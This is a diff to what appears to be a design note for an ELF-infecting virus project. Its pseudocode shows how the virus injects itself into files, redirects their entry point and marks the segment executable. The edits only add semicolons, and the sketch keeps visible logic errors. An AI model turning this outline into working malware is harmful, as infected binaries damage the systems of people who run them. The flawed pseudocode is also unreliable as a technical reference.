@@ -33,7 +33,7 @@ void	infect_dir(char *dir_path, void *start_virus)
 	dir = open_dir(dir_path);
 
 	for file in dir:
-		mem_file, file_size = mmap(file)
+		mem_file, file_size = mmap(file);
 		if (NULL != (mem_file = infect_file(mem_file, file_size, start_virus)));
 			save(file);
 	return ;
@@ -61,12 +61,12 @@ uint8_t	infect_file(void *file, size_t file_size, void *start_virus)
 	// Find again the phdr
 	elfphdr *phdr = find_phdr(file, file_size);
 	// Inject self in file
-	spot = file + (phdr->offset + phdr->size)
-	memcopy(spot, start_virus, VIRUS_SIZE)
-	file->e_entry = spot
-	phdr->rights += EXECUTE
-	phdr->size += VIRUS_SIZE
-	return file	
+	spot = file + (phdr->offset + phdr->size);
+	memcopy(spot, start_virus, VIRUS_SIZE);
+	file->e_entry = spot;
+	phdr->rights += EXECUTE;
+	phdr->size += VIRUS_SIZE;
+	return file;
 }
 ```
 
@@ -113,11 +113,11 @@ Carefull on overflow
 void *extend_memory(file, file_size, phdr, VIRUS_SIZE)
 {
 
-	int space_available = file_size - (phdr->offset + phdr->size)
-	int space_missing = space_available - VIRUS_SIZE
+	int space_available = file_size - (phdr->offset + phdr->size);
+	int space_missing = space_available - VIRUS_SIZE;
 	if space_missing < 0:
-		new_file = mmap(space_missing)
-		memcopy(new_file, file, file_size)
+		new_file = mmap(space_missing);
+		memcopy(new_file, file, file_size);
 	return new_file;
 }
 ```
@@ -128,8 +128,8 @@ void *extend_memory(file, file_size, phdr, VIRUS_SIZE)
 void bonus_function()
 {
 	whatever we want;
-	will be nice to connect to a server to say hello
-	will be nice to change background image
-	will be nice to print in terminal an ascii pic of a cute kitten
+	will be nice to connect to a server to say hello;
+	will be nice to change background image;
+	will be nice to print in terminal an ascii pic of a cute kitten;
 }
 ```
